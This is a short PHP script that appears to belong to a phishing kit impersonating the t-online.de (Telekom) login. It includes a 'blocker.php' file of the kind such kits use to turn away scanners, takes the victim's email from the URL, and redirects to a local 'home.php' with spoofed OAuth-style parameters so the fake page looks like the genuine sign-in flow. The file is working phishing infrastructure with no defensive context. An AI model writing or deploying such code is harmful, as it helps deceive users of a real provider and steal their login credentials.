<?php

include('blocker.php');
$email = $_GET['email'];
header("Location: home.php?client_id=10LIVESAM30000004901PORTAL00000000000000&state=a7ecab754260e716e7c473596636ef355b9bc63d5eddcc6d512d7061c391071d&claims=id_token?urn%3Aeir.com%3Aall%3Anull&nonce=a7ecab754260e716e7c473596636ef355b9bc63d5eddcc6d512d7061c391071d&redirect_uri=https%3A%2F%2Flogin.eir-online.de%2Fcallback&logout_uri=https%3A%2F%2Flogin.t-online.de%2Feir_logout&display=popup&scope=openid&email=$email");

?>